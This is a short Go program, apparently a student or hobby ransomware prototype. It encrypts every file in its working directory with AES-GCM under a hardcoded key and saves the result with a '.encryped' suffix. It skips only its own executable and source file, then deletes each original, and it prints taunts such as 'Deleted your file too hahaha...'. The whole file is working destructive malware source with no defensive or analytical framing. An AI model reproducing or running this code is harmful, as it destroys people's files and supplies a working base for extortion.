package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
)

func ReadFile() {

}

func ReadDir(dirname string) []os.FileInfo {
	files, err := ioutil.ReadDir(dirname)
	if err != nil {
		log.Fatal(err)
	}
	return files
}

func findImportantFiles(fileList []os.FileInfo, fileName string) int {
	for i, f := range fileList {
		if f.Name() == fileName {
			return i
		}
	}
	return -1
}

func removeFiles(fileList []os.FileInfo) []os.FileInfo {
	i := findImportantFiles(fileList, "main.exe")
	if i == -1 {
		log.Fatal("Error, file not found")
	}
	fileList = remove(fileList, i)

	i = findImportantFiles(fileList, "main.go")
	if i == -1 {
		log.Fatal("Error, file not found")
	}
	fileList = remove(fileList, i)

	return fileList
}

func remove(fileList []os.FileInfo, index int) []os.FileInfo {
	fileList[index] = fileList[len(fileList)-1]
	return fileList[:len(fileList)-1]
}

func readFile(file os.FileInfo) []byte {
	plaintext, err := ioutil.ReadFile(file.Name())
	if err != nil {
		log.Fatal(err)
	}
	return plaintext
}

func deleteFile(file os.FileInfo) {
	err := os.Remove(file.Name())
	if err != nil {
		log.Fatal(err)
	}
}

func getKey() []byte {
	key := []byte("w!z%C*F-JaNdRgUjXn2r5u8x/A?D(G+K")
	return key
}

func init_GCM_AES() cipher.AEAD {
	block, err := aes.NewCipher(getKey())
	if err != nil {
		log.Fatal(err)
	}
	//Using GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal(err)
	}

	return gcm
}

func encryptFile(file os.FileInfo, gcmObject cipher.AEAD) bool {
	plaintext := readFile(file)
	nonce := make([]byte, gcmObject.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		log.Fatal(err)
	}

	ciphertext := gcmObject.Seal(nonce, nonce, plaintext, nil)

	newEncFileName := file.Name() + ".encryped"
	err := ioutil.WriteFile(newEncFileName, ciphertext, 0777)

	if err != nil {
		log.Panic(err)
	}
	return true
}

func main() {
	path, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}
	// fmt.Println(path)

	files := ReadDir(path) //Gets list of files in directory

	files = removeFiles(files) //removes our important files

	gcm := init_GCM_AES()

	for _, f := range files { //Loop through all files in current directory
		fmt.Println(f.Name())
		if !f.IsDir() {
			result := encryptFile(f, gcm)
			if result {
				fmt.Println("File encrypted... :)")
				deleteFile(f)
				fmt.Println("Deleted your file too hahaha...")
			}
		}
	}

	//Now crypto...
	//Using AES, choose a mode and find easy implementation online please

}
